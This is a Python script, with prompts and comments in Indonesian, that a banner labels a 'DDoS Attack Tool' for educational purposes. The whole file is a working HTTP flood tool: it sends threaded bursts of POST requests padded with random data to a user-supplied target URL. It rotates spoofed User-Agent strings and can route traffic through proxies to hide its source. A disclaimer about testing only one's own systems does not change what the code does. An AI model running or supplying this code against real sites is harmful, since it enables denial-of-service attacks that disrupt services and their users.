import threading
import random
import requests
import time
import sys
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ╔══════════════════════════════════════╗
    ║           DDoS Attack Tool           ║
    ║        For Educational Purpose       ║
    ╚══════════════════════════════════════╝
    """
    print(banner)

def main():
    clear_screen()
    print_banner()
    
    print("⚠️  PERINGATAN: Hanya untuk testing sistem sendiri!")
    print("=" * 50)
    
    # Konfigurasi
    try:
        url = input("Masukkan URL target: ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        threads = int(input("Masukkan jumlah thread (1-100): "))
        threads = max(1, min(threads, 100))  # Limit threads
        
        requests_per_thread = int(input("Masukkan jumlah request per thread (1-1000): "))
        requests_per_thread = max(1, min(requests_per_thread, 1000))  # Limit requests
        
        use_proxies = input("Gunakan proxy? (y/n): ").lower() == "y"
        
    except ValueError:
        print("Error: Masukkan angka yang valid!")
        return
    except KeyboardInterrupt:
        print("\nProgram dihentikan oleh user")
        return

    # Daftar User-Agent acak
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    ]

    # Daftar proxy (jika digunakan)
    proxies = []
    if use_proxies:
        try:
            with open("proxies.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"✓ Loaded {len(proxies)} proxies from proxies.txt")
        except FileNotFoundError:
            print("✗ File proxies.txt tidak ditemukan. Tidak menggunakan proxy.")
            use_proxies = False

    print(f"\n🎯 Target: {url}")
    print(f"🧵 Threads: {threads}")
    print(f"📨 Requests per thread: {requests_per_thread}")
    print(f"🔌 Proxy: {'Yes' if use_proxies else 'No'}")
    print("=" * 50)
    
    confirm = input("Lanjutkan? (y/n): ").lower()
    if confirm != 'y':
        print("Operasi dibatalkan")
        return

    # Counter untuk request berhasil/gagal
    success_count = 0
    fail_count = 0
    counter_lock = threading.Lock()

    # Fungsi untuk mengirim permintaan
    def attack(thread_id):
        nonlocal success_count, fail_count
        for i in range(requests_per_thread):
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive",
                }
                data = {"data": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=1024))} # Kirim data acak
                
                if use_proxies and proxies:
                    proxy = random.choice(proxies)
                    try:
                        response = requests.post(url, headers=headers, data=data, 
                                               proxies={"http": proxy, "https": proxy}, timeout=5)
                        with counter_lock:
                            success_count += 1
                        print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Status: {response.status_code}")
                    except:
                        with counter_lock:
                            fail_count += 1
                        print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Proxy failed")
                else:
                    response = requests.post(url, headers=headers, data=data, timeout=5)
                    with counter_lock:
                        success_count += 1
                    print(f"✓ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Status: {response.status_code}")
                    
            except Exception as e:
                with counter_lock:
                    fail_count += 1
                print(f"✗ Thread {thread_id}: Request {i+1}/{requests_per_thread} - Error: {str(e)[:50]}...")
            
            time.sleep(0.1)

    print("\n🚀 Memulai serangan...")
    start_time = time.time()

    # Membuat dan menjalankan thread
    threads_list = []
    for i in range(threads):
        thread = threading.Thread(target=attack, args=(i+1,))
        threads_list.append(thread)
        thread.start()

    # Menunggu semua thread selesai
    for thread in threads_list:
        thread.join()

    end_time = time.time()
    duration = end_time - start_time
    
    print("\n" + "=" * 50)
    print("📊 SERANGAN SELESAI!")
    print(f"⏱️  Durasi: {duration:.2f} detik")
    print(f"✅ Request berhasil: {success_count}")
    print(f"❌ Request gagal: {fail_count}")
    print(f"📨 Total request: {success_count + fail_count}")
    print("=" * 50)

if __name__ == "__main__":
    main()
